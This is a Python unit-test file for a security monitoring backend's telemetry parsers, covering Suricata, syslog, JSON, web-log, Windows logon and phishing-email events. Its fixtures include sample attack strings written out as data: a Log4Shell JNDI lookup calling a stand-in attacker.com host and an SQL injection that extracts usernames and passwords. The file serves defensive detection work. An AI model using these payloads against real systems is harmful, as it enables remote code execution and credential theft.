"""Unit tests for specialized telemetry parsers across all 6 supported sources."""

import pytest

from backend.app.ingestion.interfaces import TelemetrySourceType
from backend.app.ingestion.parsers import (
    ApplicationLogParser,
    AuthenticationLogParser,
    EmailSecurityParser,
    JsonEventParser,
    SuricataEveParser,
    SyslogParser,
)
from backend.app.schemas.events import EventSeverity


class TestSuricataEveParser:
    """Test suite for Suricata EVE JSON parser."""

    @pytest.fixture
    def parser(self) -> SuricataEveParser:
        return SuricataEveParser()

    def test_can_parse(self, parser: SuricataEveParser) -> None:
        valid_suricata = {
            "timestamp": "2026-09-09T10:15:30.123456+0000",
            "event_type": "alert",
            "src_ip": "192.168.1.100",
            "dest_ip": "10.0.0.5",
            "alert": {"signature": "ET SCAN Nmap"},
        }
        assert parser.can_parse(valid_suricata) is True
        assert parser.can_parse("not a json string") is False

    def test_parse_alert_event(self, parser: SuricataEveParser) -> None:
        payload = {
            "timestamp": "2026-09-09T10:15:30.123456+0000",
            "event_type": "alert",
            "src_ip": "203.0.113.195",
            "src_port": 49152,
            "dest_ip": "10.0.1.50",
            "dest_port": 80,
            "proto": "TCP",
            "alert": {
                "action": "blocked",
                "signature": "ET EXPLOIT Apache Log4j RCE",
                "category": "Attempted Administrator Privilege Gain",
                "severity": 1,
            },
            "http": {
                "hostname": "portal.corp.local",
                "url": "/login?user=${jndi:ldap://attacker.com/a}",
            },
            "flow_id": 1234567890,
        }

        parsed = parser.parse(payload)
        assert parsed.source_type == TelemetrySourceType.SURICATA
        assert parsed.event_type == "network_ids_alert"
        assert parsed.source_ip == "203.0.113.195"
        assert parsed.destination_ip == "10.0.1.50"
        assert parsed.source_port == 49152
        assert parsed.destination_port == 80
        assert parsed.protocol == "TCP"
        assert parsed.severity == EventSeverity.CRITICAL
        assert parsed.action == "blocked"
        assert parsed.status == "triggered"
        assert (
            parsed.url
            == "http://portal.corp.local/login?user=${jndi:ldap://attacker.com/a}"
        )
        assert parsed.metadata["flow_id"] == 1234567890


class TestSyslogParser:
    """Test suite for Syslog RFC 3164 / 5424 and security log parser."""

    @pytest.fixture
    def parser(self) -> SyslogParser:
        return SyslogParser()

    def test_parse_sshd_failed_password(self, parser: SyslogParser) -> None:
        line = "<85>Sep  9 10:15:30 soc-srv sshd[14205]: Failed password for invalid user hacker from 198.51.100.25 port 55432 ssh2"
        parsed = parser.parse(line)

        assert parsed.source_type == TelemetrySourceType.SYSLOG
        assert parsed.event_type == "auth_failed"
        assert parsed.username == "hacker"
        assert parsed.source_ip == "198.51.100.25"
        assert parsed.source_port == 55432
        assert parsed.hostname == "soc-srv"
        assert parsed.action == "denied"
        assert parsed.status == "failure"
        assert parsed.severity == EventSeverity.MEDIUM

    def test_parse_sshd_accepted_key(self, parser: SyslogParser) -> None:
        line = "Sep  9 10:20:00 bastion sshd[14210]: Accepted publickey for admin from 10.0.1.5 port 42100 ssh2"
        parsed = parser.parse(line)

        assert parsed.event_type == "auth_success"
        assert parsed.username == "admin"
        assert parsed.source_ip == "10.0.1.5"
        assert parsed.action == "allowed"
        assert parsed.status == "success"

    def test_parse_ufw_block(self, parser: SyslogParser) -> None:
        line = "<4>Sep  9 10:25:00 fw-node kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22 SRC=203.0.113.99 DST=10.0.0.1 LEN=40 PROTO=TCP SPT=44123 DPT=22"
        parsed = parser.parse(line)

        assert parsed.event_type == "firewall_drop"
        assert parsed.source_ip == "203.0.113.99"
        assert parsed.destination_ip == "10.0.0.1"
        assert parsed.source_port == 44123
        assert parsed.destination_port == 22
        assert parsed.protocol == "TCP"
        assert parsed.action == "blocked"
        assert parsed.status == "blocked"


class TestJsonEventParser:
    """Test suite for Generic JSON security event parser."""

    @pytest.fixture
    def parser(self) -> JsonEventParser:
        return JsonEventParser()

    def test_parse_cloud_audit_json(self, parser: JsonEventParser) -> None:
        payload = {
            "@timestamp": "2026-09-09T11:00:00Z",
            "eventName": "AuthorizeSecurityGroupIngress",
            "source.ip": "198.51.100.77",
            "destination.ip": "10.0.0.1",
            "user.name": "devops_admin",
            "risk_level": "high",
            "action": "allowed",
            "status": "success",
        }

        parsed = parser.parse(payload)
        assert parsed.source_type == TelemetrySourceType.JSON
        assert parsed.event_type == "authorizesecuritygroupingress"
        assert parsed.source_ip == "198.51.100.77"
        assert parsed.destination_ip == "10.0.0.1"
        assert parsed.username == "devops_admin"
        assert parsed.severity == EventSeverity.HIGH


class TestApplicationLogParser:
    """Test suite for Application and Web access log parser."""

    @pytest.fixture
    def parser(self) -> ApplicationLogParser:
        return ApplicationLogParser()

    def test_parse_combined_access_log_with_sqli(
        self, parser: ApplicationLogParser
    ) -> None:
        log_line = (
            "198.51.100.12 - - [09/Sep/2026:12:00:00 +0000] "
            '"GET /products?category=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" '
            '200 4521 "https://corp.local" "Mozilla/5.0"'
        )

        parsed = parser.parse(log_line)
        assert parsed.source_type == TelemetrySourceType.APPLICATION
        assert parsed.event_type == "web_sqli_attempt"
        assert parsed.source_ip == "198.51.100.12"
        assert parsed.severity == EventSeverity.HIGH
        assert parsed.metadata["is_sqli_pattern"] is True

    def test_parse_401_unauthorized(self, parser: ApplicationLogParser) -> None:
        log_line = '10.0.1.20 - user1 [09/Sep/2026:12:05:00 +0000] "POST /api/login HTTP/1.1" 401 128 "-" "curl/7.88"'
        parsed = parser.parse(log_line)

        assert parsed.event_type == "web_unauthorized"
        assert parsed.severity == EventSeverity.MEDIUM
        assert parsed.action == "denied"
        assert parsed.username == "user1"


class TestAuthenticationLogParser:
    """Test suite for Windows and PAM authentication log parser."""

    @pytest.fixture
    def parser(self) -> AuthenticationLogParser:
        return AuthenticationLogParser()

    def test_parse_windows_logon_failure_4625(
        self, parser: AuthenticationLogParser
    ) -> None:
        payload = {
            "EventID": 4625,
            "TimeCreated": "2026-09-09T13:00:00Z",
            "TargetUserName": "Administrator",
            "TargetDomainName": "CORP",
            "WorkstationName": "WS-FINANCE-01",
            "IpAddress": "203.0.113.55",
            "IpPort": 51234,
            "LogonType": "3",
            "FailureReason": "Unknown user name or bad password.",
        }

        parsed = parser.parse(payload)
        assert parsed.source_type == TelemetrySourceType.AUTHENTICATION
        assert parsed.event_type == "user_logon_failed"
        assert parsed.severity == EventSeverity.HIGH
        assert parsed.username == "Administrator"
        assert parsed.domain == "CORP"
        assert parsed.hostname == "WS-FINANCE-01"
        assert parsed.source_ip == "203.0.113.55"
        assert parsed.source_port == 51234
        assert parsed.action == "denied"
        assert parsed.status == "failure"
        assert parsed.metadata["windows_event_id"] == 4625


class TestEmailSecurityParser:
    """Test suite for Email Security, SPF/DKIM/DMARC, and phishing parser."""

    @pytest.fixture
    def parser(self) -> EmailSecurityParser:
        return EmailSecurityParser()

    def test_parse_phishing_event(self, parser: EmailSecurityParser) -> None:
        payload = {
            "timestamp": "2026-09-09T14:00:00Z",
            "sender": "spoofed@fake-bank.xyz",
            "recipient": "victim@corp.local",
            "subject": "Urgent: Update your credentials",
            "spf_result": "fail",
            "dkim_result": "fail",
            "dmarc_result": "reject",
            "phishing_score": 0.95,
            "threat_verdict": "phishing",
            "extracted_urls": ["http://phish-bank-login.xyz/auth"],
            "attachment_hashes": [
                "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
            ],
        }

        parsed = parser.parse(payload)
        assert parsed.source_type == TelemetrySourceType.EMAIL
        assert parsed.event_type == "email_phishing_detected"
        assert parsed.severity == EventSeverity.HIGH
        assert parsed.username == "spoofed@fake-bank.xyz"
        assert parsed.domain == "fake-bank.xyz"
        assert parsed.url == "http://phish-bank-login.xyz/auth"
        assert (
            parsed.hash
            == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        )
        assert parsed.action in ("quarantined", "blocked")
